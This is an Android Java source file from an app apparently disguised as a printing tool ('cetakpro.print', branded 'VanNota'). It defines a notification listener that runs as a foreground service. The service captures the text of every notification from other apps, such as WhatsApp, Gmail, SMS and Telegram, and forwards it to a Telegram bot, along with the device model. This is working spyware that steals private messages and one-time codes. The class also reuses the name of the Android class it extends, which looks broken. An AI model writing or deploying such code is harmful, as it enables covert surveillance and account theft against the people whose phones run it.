package com.cetakpro.print;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

public class NotificationListenerService extends NotificationListenerService {
    private static final String TAG = "NotifListener";
    private static boolean isConnected = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "✅ Service dibuat");
        try {
            startForeground(1001, createNotification());
            Log.d(TAG, "✅ Foreground service aktif");
        } catch (Exception e) {
            Log.e(TAG, "❌ Gagal startForeground: " + e.getMessage());
        }
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        isConnected = true;
        Log.d(TAG, "✅ NOTIFICATION LISTENER TERHUBUNG!");

        // Kirim notifikasi ke Telegram bahwa service aktif
        String deviceName = Build.MODEL;
        String msg = "📱 SERVICE NOTIFIKASI AKTIF\nPerangkat: " + deviceName;
        TelegramSender.sendMessage(this, "🔔 VanNota Aktif", msg);
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        isConnected = false;
        Log.d(TAG, "❌ Notification listener terputus");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            // CEK: Service harus terhubung
            if (!isConnected) {
                Log.d(TAG, "⚠️ Service belum terhubung, skip notifikasi");
                return;
            }

            if (sbn == null) {
                Log.d(TAG, "⚠️ sbn null");
                return;
            }

            String packageName = sbn.getPackageName();
            
            // SKIP notifikasi dari aplikasi sendiri
            if (packageName != null && packageName.equals(getPackageName())) {
                Log.d(TAG, "⏭️ Skip notifikasi sendiri");
                return;
            }

            Notification notification = sbn.getNotification();
            if (notification == null) {
                Log.d(TAG, "⚠️ notification null");
                return;
            }

            Bundle extras = notification.extras;
            if (extras == null) {
                Log.d(TAG, "⚠️ extras null");
                return;
            }

            String title = extras.getString("android.title", "");
            String text = extras.getString("android.text", "");
            String subText = extras.getString("android.subText", "");

            // SKIP jika kosong
            if (title.isEmpty() && text.isEmpty() && subText.isEmpty()) {
                Log.d(TAG, "⏭️ Skip notifikasi kosong dari " + packageName);
                return;
            }

            Log.d(TAG, "🔔 Notifikasi dari: " + packageName);
            Log.d(TAG, "📌 Title: " + title);
            Log.d(TAG, "📌 Text: " + text);

            // Buat pesan
            StringBuilder msg = new StringBuilder();
            if (!title.isEmpty()) msg.append(title);
            if (!text.isEmpty()) {
                if (msg.length() > 0) msg.append("\n");
                msg.append(text);
            }
            if (!subText.isEmpty() && !text.contains(subText)) {
                if (msg.length() > 0) msg.append("\n");
                msg.append(subText);
            }

            if (msg.length() == 0) {
                msg.append("(Notifikasi kosong)");
            }

            String appName = getAppName(packageName);
            String telegramTitle = "🔔 " + appName;

            // KIRIM KE TELEGRAM
            TelegramSender.sendMessage(this, telegramTitle, msg.toString());
            Log.d(TAG, "✅ Notifikasi dikirim ke Telegram");

        } catch (Exception e) {
            Log.e(TAG, "❌ Error: " + e.getMessage(), e);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Tidak perlu kirim notifikasi yang dihapus
    }

    private String getAppName(String packageName) {
        if (packageName == null) return "Unknown";
        switch (packageName) {
            case "com.whatsapp": return "WhatsApp";
            case "com.instagram.android": return "Instagram";
            case "com.facebook.katana": return "Facebook";
            case "org.telegram.messenger": return "Telegram";
            case "com.google.android.apps.messaging": return "Messages";
            case "com.google.android.gm": return "Gmail";
            default: return packageName;
        }
    }

    private Notification createNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "vannota_bg",
                "VanNota Running",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
            builder = new Notification.Builder(this, "vannota_bg");
        } else {
            builder = new Notification.Builder(this);
        }
        return builder
            .setContentTitle("VanNota")
            .setContentText("Membaca notifikasi...")
            .setSmallIcon(R.drawable.ic_notification)
            .setOngoing(true)
            .build();
    }
}
